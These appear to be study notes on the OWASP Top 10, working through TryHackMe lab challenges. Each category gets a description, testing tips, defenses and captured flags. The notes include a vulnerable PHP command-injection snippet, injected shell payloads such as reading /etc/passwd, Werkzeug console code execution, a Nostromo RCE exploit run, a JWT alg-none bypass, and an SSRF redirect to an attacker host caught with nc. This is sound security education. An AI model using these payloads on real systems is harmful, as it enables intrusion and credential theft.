## OWASP Top 10

* OWASP: nonprofit for web-app security resources.
* Top 10 list (summary):
``` 
Broken Access Control
Cryptographic Failures
Injection
Insecure Design
Security Misconfiguration
Vulnerable & Outdated Components
Identification & Authentication Failures
Software & Data Integrity Failures
Security Logging & Monitoring Failures
SSRF
```
---

### 🔹 1. Broken Access Control

* What it is: Authorization checks missing/incorrect → attackers access pages or data they shouldn’t.
* Impact: read/modify other users’ data, perform privileged actions.
* Common flavours: IDOR (Insecure Direct Object References), missing role checks, forced browsing, elevation of privilege.
* How to test: tamper object IDs (URL params, JSON IDs, cookies, headers); test forced browsing; check horizontal & vertical privilege escalation.
* Defenses: server-side authorization on every request, deny-by-default, remove direct object references (or verify ownership), implement least privilege.

#### IDOR (example)

* Pattern: [https://site/account?id=111111](https://site/account?id=111111) — change id to another value (e.g., 222222).
* Root cause: app trusts object identifier without verifying ownership.

---

### 🔹 2. Cryptographic Failures

* What it is: wrong/missing cryptography causing sensitive-data exposure (in-transit or at-rest).
* Common issues: HTTP without TLS, weak ciphers, improper key management, storing secrets in plaintext, broken hashing (MD5, unsalted hashes), leaking DB files under webroot.
* Attacker techniques: MITM, download exposed flat-file DBs (e.g. SQLite) and crack hashes offline.
* Defenses: TLS everywhere (HSTS), use modern ciphers, proper key management, strong password hashing (bcrypt/argon2/scrypt) with salts, avoid storing secrets in repo/webroot.

#### SQLite example (commands)

```bash
$ sqlite3 example.db
sqlite> .tables
sqlite> PRAGMA table_info(customers);
sqlite> SELECT * FROM customers;
```

* Example row: `0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`
* Notes: last column may be an MD5 hash — crack with hashcat/online DBs to reveal plaintext (e.g. `qwertyuiop`).

#### Challenge outputs (from notes)

* Sensitive dir: `/assets`
* DB file: `webapp.db`
* Admin password hash: `6eea9b7ef19179a06954edd0f6c05ceb`
* Cracked admin password: `qwertyuiop`
* Flag: `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

---

### 🔹 3. Injection

* What it is: attacker-supplied input interpreted as code/queries by backend (SQL, OS commands, LDAP, XML, etc.).
* Main types: SQLi, Command injection, LDAPi, XXE.
* Root causes: concatenating user input into commands/queries without sanitization.
* Defenses: use parameterized queries/ORMs, input validation (allowlist), avoid exec of user input, use safe libraries.

#### 3.1 Command Injection (example)

* Vulnerable PHP snippet:

```php
if (isset($_GET['mooing'])) {
  $mooing = $_GET['mooing'];
  $cow = isset($_GET['cow']) ? $_GET['cow'] : 'default';
  passthru("perl /usr/bin/cowsay -f $cow $mooing");
}
```

* Why vulnerable: `$cow` and `$mooing` concatenated into shell command → attacker can inject inline commands: `$(whoami)` or `; ls -la`.
* Inline command trick: `$(command)` executes first in bash, result used by outer command.

#### Common commands used in labs

* List files: `$(ls)` → output `drpepper.txt`
* Count non-system users: `$(cat /etc/passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}' | wc -l)` → `0`
* App user: `$(whoami)` → `apache`
* User shell: `$(getent passwd $(whoami))` → `/sbin/nologin`
* Alpine version: `$(cat /etc/alpine-release)` → `3.16.0`

---

### 🔹 4. Insecure Design

* What it is: architectural or design-level flaws (threat modelling missing or wrong assumptions).
* Examples: weak password reset flows, assumptions about attacker resources (IP-limited rate-limiting), disabled security checks in prod.
* Impact: systemic vulnerabilities requiring redesign (not just patching code).
* Defenses: threat modelling during design, secure SDLC, design reviews, apply defense-in-depth.

#### Practical example (from notes)

* Flawed reset logic allowed attack to get into `joseph`’s account.
* Flag found in joseph’s account: `THM{Not_3ven_c4tz_c0uld_sav3_U!}`

---

### 🔹 5. Security Misconfiguration

* What it is: insecure default configs, exposed debug interfaces, unnecessary features, overly permissive CORS, verbose error messages, default creds.
* Attack paths: exposed admin/debug consoles (Werkzeug), leftover sample files, open S3 buckets, console shells.
* Defenses: remove/disable dev/debug features in prod, apply hardening guides, inventory & minimal install, automated config checks.

#### Debugging interface example (Werkzeug)

* Werkzeug debug console can execute arbitrary Python if exposed.
* Example exploit steps (notes):

  * Access `/console` on the app.
  * Run `import os; print(os.popen("ls -l").read())` to list files.
  * Read `app.py` to find `secret_flag`.
* Outputs from challenge:

  * DB file: `todo.db`
  * Flag: `THM{Just_a_tiny_misconfiguration}`

---

### 🔹 6. Vulnerable and Outdated Components

Organizations often use outdated software with known vulnerabilities — e.g., WordPress 4.6 vulnerable to unauthenticated RCE. Attackers can easily exploit such flaws using public exploits from sources like **Exploit-DB**.

#### Example: Nostromo 1.9.6

* Tool: Exploit-DB
* CVE: CVE-2019-16278
* After fixing the exploit script and executing it:

  ```bash
  python2 47837.py 127.0.0.1 80 id
  ```

  **Result:** Remote Code Execution (RCE) as `_nostromo`.

#### Lab

* Target: `http://10.201.111.4:84`
* Steps: Find exploit → run → upload web shell → execute commands

  ```bash
  cat /opt/flag.txt
  ```
* **Flag:** `THM{But_1ts_n0t_my_f4ult!}`

---

### 🔹 7. Identification and Authentication Failures

Authentication controls verify user identity; weak implementations can expose accounts.

**Common Flaws:**

* Weak password policies
* Brute-force vulnerability
* Predictable or insecure session cookies

**Mitigations:**

* Enforce strong password policies
* Implement lockout after failed attempts
* Use Multi-Factor Authentication (MFA)

#### Practical: Registration Logic Flaw

* Vulnerability: Re-registration of existing users with whitespace variations.
* Target: `http://10.201.40.243:8088`

| Target User | Trick Used  | Flag                               |
| ----------- | ----------- | ---------------------------------- |
| `darren`    | `" darren"` | `fe86079416a21a3c99937fea8874b667` |
| `arthur`    | `" arthur"` | `d9ac0f7db4fda460ac3edeb75d75e16e` |

---

### 🔹 8. Software and Data Integrity Failures

**Integrity** ensures data hasn’t been tampered with. Hashes (MD5, SHA1, SHA256) verify this — e.g., checking software downloads with published checksums.

#### Data Integrity Failures Example

Applications trusting user-modifiable data (like cookies) can be exploited if integrity checks are missing.

**Fix:** Use **JSON Web Tokens (JWTs)** with proper signature validation.

#### JWT None Algorithm Exploit

Some libraries allowed signature bypass via:

1. Changing header `alg` to `none`
2. Removing signature

**Lab:**

* Target: `http://10.201.40.243:8089/`
* Login as `guest` → capture JWT (`jwt-session`) → modify payload to `admin` → re-encode.
* **Flag:** `THM{Dont_take_cookies_from_strangers}`

---

### 🔹 9. Security Logging and Monitoring Failures

Proper logging enables detection and investigation of security incidents.
Missing or weak logging increases risks of **undetected attacks** and **regulatory non-compliance**.

**Key Logging Data:**

* HTTP status codes
* Timestamps
* Usernames
* Endpoints
* IP addresses

**Monitoring Goals:**
Detect suspicious patterns — e.g., brute force attempts, anomalous IPs, automated requests, or known payloads.

#### Lab:

* Analyze logs
* **Attacker IP:** `49.99.13.16`
* **Attack Type:** `Brute Force`

---

### 🔹 10. Server-Side Request Forgery (SSRF)

Occurs when an application fetches remote resources based on **user-controlled input**, allowing attackers to make the server issue arbitrary requests.

#### Example Scenario

Vulnerable endpoint:

```
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```

This forces the server to request:

```
https://attacker.thm/api/send?msg=ABC
```

#### Possible Impacts

* Internal network enumeration
* Access to restricted services
* Remote Code Execution (RCE)

#### Lab:

* Target: `http://MACHINE_IP:8087/`
* **Admin Area Access:**

  * Allowed host → `localhost`
  * Default server param → `secure-file-storage.com`
  * Redirect request to AttackBox and intercept API key
```
AttackBox
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```
* **Flag:** `THM{Hello_Im_just_an_API_key}`
